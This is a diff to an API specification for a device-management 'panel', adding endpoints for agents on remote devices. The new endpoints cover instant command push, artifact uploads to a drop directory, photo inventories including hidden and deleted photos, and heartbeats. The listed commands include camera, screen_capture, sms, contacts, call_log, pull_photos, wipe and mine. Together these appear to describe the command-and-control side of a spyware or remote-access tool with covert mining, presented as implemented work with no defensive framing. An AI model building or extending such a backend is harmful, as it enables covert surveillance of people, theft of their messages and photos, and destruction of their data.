@@ -111,3 +111,24 @@ Legend: `silent refresh` = exactly one refresh-token exchange on 401, then retry
 |--------------|--------|
 | /panel/mocks/handlers.js | P1..P7 in dev server and Playwright |
 | /panel/mocks/fixtures/index.js | 3 devices, 1 operator account |
+
+---
+
+## v2 endpoints (implemented)
+
+| # | Method | Path | Purpose | Auth |
+|---|--------|------|---------|------|
+| P8 | POST | /api/auth/2fa | Exchange pre2fa `ticket` + `code` for access/refresh tokens | none |
+| P9 | GET | /api/devices/{id}/photos | Photo inventory + `{counts:{original,hidden,deleted}}` | Bearer access |
+| P10 | POST | /api/devices/{id}/photos/report | Agent inventory upsert (device-only) | device credential |
+| P11 | POST | /api/devices/{id}/files | Agent artifact upload (b64 + sha256) → drop dir, dedup by hash | device credential |
+| P12 | GET | /api/devices/{id}/files | `{count, dir}` — "Downloaded: X" | Bearer access |
+| P13 | GET | /api/devices/{id}/events | SSE stream — instant command push (`data: {cmd}`) | device credential |
+| P14 | POST | /api/devices/{id}/commands/{cid}/result | Agent reports `executed|failed` + result | device credential |
+| P15 | POST | /api/devices/{id}/heartbeat | 15 s heartbeat `{gender, stats}` | device credential |
+
+Notes:
+- `GET /devices/{id}/commands` accepts **both** auth kinds: user (owner) and device credential.
+- Command vocabulary: `ping, wipe, camera, pull_photos, screen_capture, sms, contacts, call_log, mine`.
+- `wipe` → `executed` flips `Device.formattedAt` + `status=formatted` (dashboard "محذوف").
+- File drop: `PANEL_DROP_DIR/{deviceId}/{category}/{ts}_{name}`, SHA-256 dedup via `DownloadedFile`.
